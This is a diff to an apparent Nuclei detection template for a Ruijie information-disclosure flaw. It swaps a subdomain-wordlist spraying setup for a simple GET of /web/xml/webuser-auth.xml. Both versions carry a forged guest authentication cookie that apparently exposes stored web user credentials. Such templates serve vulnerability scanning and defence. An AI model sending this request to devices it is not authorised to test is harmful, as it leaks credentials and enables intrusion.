@@ -8,17 +8,12 @@ info:
   tags: ruijie,disclosure,cnvd
 
 requests:
-  - payloads:
-      Subdomains: /home/mahmoud/Wordlist/AllSubdomains.txt
-    attack: sniper
-    threads: 100
+  - method: GET
+    path:
+      - "{{BaseURL}}/web/xml/webuser-auth.xml"
+    headers:
+      Cookie: login=1; auth=Z3Vlc3Q6Z3Vlc3Q%3D; user=guest
 
-    raw:
-      - |
-        GET /web/xml/webuser-auth.xml  HTTP/1.1
-        Host: {{Subdomains}}
-        User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0
-        Cookie: login=1; auth=Z3Vlc3Q6Z3Vlc3Q%3D; user=guest
     matchers-condition: and
     matchers:
 
